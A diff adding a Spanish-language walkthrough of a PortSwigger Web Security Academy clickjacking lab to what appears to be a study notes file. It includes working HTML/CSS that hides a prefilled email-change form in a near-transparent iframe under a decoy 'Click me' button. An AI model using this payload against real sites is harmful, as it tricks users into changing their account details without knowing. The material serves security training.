@@ -428,6 +428,32 @@ Para resolver este laboratorio, después de autenticarse con las credenciales pr
 <iframe src="https://ac411f041eabd7098042860e00170056.web-security-academy.net/account"></iframe>
 ```
 
+### [Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)
+
+El objetivo del laboratorio es cambiar la dirección de correo electrónico del usuario rellenando previamente un formulario utilizando parámetros URL e intentar engañarlo para que haga click en un botón "Update Email" sin que el mismo sepa.
+
+Para resolver este laboratorio, después de autenticarse con las credenciales provistas, dirigirse a Change Email, y tomando esta url, la ponemos en el src del siguiente iframe, seguido del parámetro email.
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top:560px;
+        left: 60px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://ac681f121f04aa6b80980439004b0021.web-security-academy.net/email?email=alguien@algo.com"></iframe>
+```
+
 ---
 
 ## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
